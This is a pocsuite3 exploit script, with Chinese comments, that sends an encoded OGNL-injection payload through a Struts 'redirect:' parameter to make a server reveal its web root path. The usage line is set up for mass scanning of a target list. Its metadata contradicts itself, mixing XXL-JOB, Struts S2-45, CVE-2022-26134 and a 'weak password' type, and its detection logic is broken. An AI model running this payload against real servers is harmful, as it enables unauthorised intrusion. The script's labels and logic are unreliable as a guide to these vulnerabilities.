from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


# 关于类的继承
class XXLJOBPOC(POCBase):
    # fofa语句: title="任务调度中心"
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "wang"  # PoC作者的大名
    vulDate = "2021-11-11"  # 漏洞公开的时间,不知道就写今天
    createDate = "2021-11-11"  # 编写 PoC 的日期
    updateDate = "2021-11-11"  # PoC 更新的时间,默认和编写时间一样
    references = ["http://pro.aeliaoutremer.com"]  # 漏洞地址来源,0day不用写
    name = "pocsuite3_S2-45-poc"  # PoC 名称
    appPowerLink = "http://pro.aeliaoutremer.com"  # 漏洞厂商主页地址
    appName = "CVE-2022-26134"  # 漏洞应用名称
    appVersion = """
    Struts 2.3.5 - 2.3.31
    Struts 2.5 - 2.5.10
                    """  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """CVE-2022-26134远程命令执行漏洞。"""  # 漏洞简要描述
    pocDesc = """pocsuite -r pocsuite3_S2-45-poc.py -f url.txt --save-file ./res.txt --threads 50"""  # POC用法描述

    def _check(self):
        result = []
        # 漏洞验证代码
        # self.url 就是你指定的-u 参数的值
        full_url = f"{self.url}""?redirect:%24{%23req%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletReq%27%2B%27uest%27)%2C%23resp%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletRes%27%2B%27ponse%27)%2C%23resp.setCharacterEncoding(%27UTF-8%27)%2C%23ot%3D%23resp.getWriter%20()%2C%23ot.print(%27web%27)%2C%23ot.print(%27path%3A%27)%2C%23ot.print(%23req.getSession().getServletContext().getRealPath(%27%2F%27))%2C%23ot.flush()%2C%23ot.close()}"

        try:
            response = requests.get(full_url, allow_redirects=False, verify=False,
                                    timeout=5)
        except Exception:
            if 'webpath' in response.text:
                result.append(self.url)
        return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


# 你会发现没有shell模式 , 对吧 ,根本就用不到

# 其他自定义的可添加的功能函数
def other_fuc():
    pass


# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(XXLJOBPOC)
